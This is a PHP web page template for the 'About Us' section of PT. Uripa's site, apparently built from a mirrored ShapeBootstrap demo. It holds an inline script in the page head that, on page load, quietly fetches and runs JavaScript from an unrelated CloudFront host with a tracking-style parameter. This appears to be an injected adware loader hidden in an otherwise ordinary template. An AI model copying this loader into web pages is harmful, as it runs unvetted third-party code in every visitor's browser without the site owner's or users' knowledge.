<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from shapebootstrap.net/demo/html/multi/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 28 Feb 2017 05:43:57 GMT -->
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="">
	<meta name="author" content="">
	<title>Template Uripa || New</title>

	<link href="<?php echo base_url() . 'component/web/css/bootstrap.min.css'?>" rel="stylesheet">
	<link href="<?php echo base_url() . 'component/web/css/font-awesome.min.css'?>" rel="stylesheet">
	<link href="<?php echo base_url() . 'component/web/css/animate.min.css'?>" rel="stylesheet">
	<link href="<?php echo base_url() . 'component/web/css/owl.carousel.css'?>" rel="stylesheet">
	<link href="<?php echo base_url() . 'component/web/css/owl.transitions.css'?>" rel="stylesheet">
	<link href="<?php echo base_url() . 'component/web/css/prettyPhoto.css'?>" rel="stylesheet">
	<link href="<?php echo base_url() . 'component/web/css/main.css'?>" rel="stylesheet">
	<link href="<?php echo base_url() . 'component/web/css/responsive.css'?>" rel="stylesheet">
<!--[if lt IE 9]>
    <script src="js/html5shiv.js"></script>
    <script src="js/respond.min.js"></script>
    <![endif]-->
    <link rel="shortcut icon" href="<?php echo base_url() . 'component/web/css/images/ico/favicon.ico'?>">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="<?php echo base_url() . 'component/web/css/images/ico/apple-touch-icon-144-precomposed.png'?>">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="<?php echo base_url() . 'component/web/css/images/ico/apple-touch-icon-114-precomposed.png'?>">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="<?php echo base_url() . 'component/web/css/images/ico/apple-touch-icon-72-precomposed.png'?>">
    <link rel="apple-touch-icon-precomposed" href="<?php echo base_url() . 'component/web/images/ico/apple-touch-icon-57-precomposed.png'?>">
    <script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="../../../../d36mw5gp02ykm5.cloudfront.net/yc/adrns_y961f.js?v=6.11.124#p=samsungxhm500ji_s1wfj9eb603320";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script></head> 
    <body id="home" class="homepage">
    	<header id="header">
    		<nav id="main-menu" class="navbar navbar-default navbar-fixed-top" role="banner" style="background-color:white; opacity: 1  ; height : 80px;">
                <div class="container">
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                            <span class="sr-only">Toggle navigation</span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                        <a class="navbar-brand" href="<?php echo base_url() . 'index.php'?>"><img src="<?php echo base_url() . 'component/web/images/URIPAlogos.png'?>" style="width:200px;margin-bottom:5px"alt="logo"></a>
                    </div>
                    <div class="collapse navbar-collapse navbar-right">
                        <ul class="nav navbar-nav">
                            <li class=""><a href="<?php echo base_url().'index.php'?>" style="font-weight: bold;font-family: arial;font-size: 18px;color:#b245d6;border-top:">Home</a></li>
                            <!-- <li class="scroll"><a href="#features">Features</a></li> -->
                            <li class="scroll active"><a href="<?php echo base_url().'#about'?>" style="font-weight: bold;font-family: arial;font-size: 18px;color: #b245d6;">About</a></li>
                            <li class=""><a href="<?php echo base_url().'#blog'?>" style="font-weight: bold;font-family: arial;font-size: 18px;color: #b245d6;">Our Services</a></li>
                            <li class=""><a href="<?php echo base_url().'#pricing'?>" style="font-weight: bold;font-family: arial;font-size: 18px;color: #b245d6;">Packet</a></li>
                            <!-- <li class=""><a href="#portfolio">Portfolio</a></li> -->

                            <li class=""><a href="<?php echo base_url().'#portofolio'?>" style="font-weight: bold;font-family: arial;font-size: 18px;color: #b245d6;">Our Gallery</a></li>
                            <!-- <li class=""><a href="#pricing">Pricing</a></li> -->
                            <!-- <li class=""><a href="#blog">News</a></li> -->
                            <li class=" "><a href="<?php echo base_url().'#news'?>" style="font-weight: bold;font-family: arial;font-size: 18px;color: #b245d6;">News</a></li>
                            <li class=""><a href="<?php echo base_url().'#contact'?>" style="font-weight: bold;font-family: arial;font-size: 18px;color: #b245d6;">Contact</a></li>
                            <li class=""><a href="http://sistem.uripatravel.com" target="_blank" style="font-weight: bold;font-family: arial;font-size: 18px;color: white;">
                <img style="position:relative;top: -20px;" src="<?php echo base_url() . 'component/web/images/URIPA_LOGIN2.png'; ?>" alt="" width="100px" height="50px"/></a></li>
                        </ul>
                    </div>
                </div> 
            </nav>
        </header> 
        <section id="about">
                         <div class="container">
                          <div class="section-header">
                           <h2 class="section-title text-center wow fadeInDown" >About Us PT. Uripa</h2>
                           <p class="text-center wow fadeInDown"></p>
                          </div>
                          <div class="row">
                          <?php 
                          $get_profile = $this->db->get("tentang");
                          $hasil_profile = $get_profile->row();

                          $string_foto = $hasil_profile->image;
                          list($name_img) = (explode('|', $string_foto));

                          ?>  

                          <div class="col-sm-6 wow fadeInRight">
                           <p align="justify"> <?php echo $hasil_profile->keterangan;?></p>
              </div>
            </div>
          </div>
        </section> 
            
    </div>
</div>
</div>
<footer id="footer">
 <div class="container">
  <div class="row">
   <div class="col-sm-6">
    &copy; 2017 URIPA. Designed by Cloud Astro  <!-- <a target="_blank" href="http://shapebootstrap.net/" title="Free Twitter Bootstrap WordPress Themes and HTML templates">ShapeBootstrap</a> -->
</div>
<div class="col-sm-6">
    <ul class="social-icons">
        <li><a href="https://www.facebook.com/pages/Kantor-PT-Uripa-Usaha-Mandiri-Palsapad-JL-Pintu-Gerbang-Gg-4-NO-12/1438739913035858" target="_blank"><i class="fa fa-facebook"></i></a></li>
        <li><a href="#"><i class="fa fa-twitter"></i></a></li>
        <li><a href="https://plus.google.com/117686190213961984003" target="_blank"><i class="fa fa-google-plus"></i></a></li>
                    <!--<li><a href="#"><i class="fa fa-pinterest"></i></a></li>
                    <li><a href="#"><i class="fa fa-dribbble"></i></a></li>
                    <li><a href="#"><i class="fa fa-behance"></i></a></li>
                    <li><a href="#"><i class="fa fa-flickr"></i></a></li>
                    <li><a href="#"><i class="fa fa-youtube"></i></a></li>
                    <li><a href="#"><i class="fa fa-linkedin"></i></a></li>
                    <li><a href="#"><i class="fa fa-github"></i></a></li>
                -->    </ul>
            </div>
        </div>
    </div>
</footer> 
<script src="<?php echo base_url() . 'component/web/js/jquery.js'?>"></script>
<script src="<?php echo base_url() . 'component/web/js/bootstrap.min.js'?>"></script>
<script src="<?php echo base_url() . 'component/web/js/owl.carousel.min.js'?>"></script>
<script src="<?php echo base_url() . 'component/web/js/mousescroll.js'?>"></script>
<script src="<?php echo base_url() . 'component/web/js/smoothscroll.js'?>"></script>
<script src="<?php echo base_url() . 'component/web/js/jquery.prettyPhoto.js'?>"></script>
<script src="<?php echo base_url() . 'component/web/js/jquery.isotope.min.js'?>"></script>
<script src="<?php echo base_url() . 'component/web/js/jquery.inview.min.js'?>"></script>
<script src="<?php echo base_url() . 'component/web/js/wow.min.js'?>"></script>
<script src="<?php echo base_url() . 'component/web/js/main.js'?>"></script>
<script src="http://maps.google.com/maps/api/js?sensor=true"></script>
</body>

<!-- Mirrored from shapebootstrap.net/demo/html/multi/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 28 Feb 2017 05:44:58 GMT -->
</html>